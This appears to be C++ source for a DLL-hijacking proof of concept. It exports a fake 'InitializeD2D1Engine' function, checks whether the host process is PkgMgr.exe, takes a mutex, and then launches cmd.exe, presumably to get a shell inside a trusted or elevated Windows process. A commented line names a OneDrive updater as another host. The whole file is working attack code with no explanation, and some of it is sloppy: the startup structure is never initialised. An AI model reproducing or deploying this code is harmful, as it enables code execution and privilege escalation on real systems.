#include "Windows.h"
#include <string>
#include "psapi.h"
BOOL CheckProcessName(){
    char pName[1024];
        GetProcessImageFileNameA((HANDLE)-1, pName, 1024);
        char * p;
        p = strtok(pName, "\\"); 
        while (p != NULL) {
            
            if(!strcmp(p, "PkgMgr.exe"))
                return TRUE;
                
            
                p = strtok(NULL, "\\");
            
        }
    return FALSE;
}

void spawn(){
    STARTUPINFOA  si;
    PROCESS_INFORMATION pi;
    //CreateProcessA("C:\\Users\\fa69iblsa\\appdata\\local\\microsoft\\onedrive\\OneDriveStandaloneUpdater.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    exit(0);
}

extern "C" __declspec(dllexport) int InitializeD2D1Engine() {
    if(CheckProcessName()){
        HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, "d2d1mtx01");
        if(!hMutex){
            CreateMutex(NULL, TRUE, "d2d1mtx01");
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)spawn, 0, 0,0);
            while(true){

            }
        } else
            return 0;
    } else {

        FreeLibrary(GetModuleHandle(NULL)); 
    }
              
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
	case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


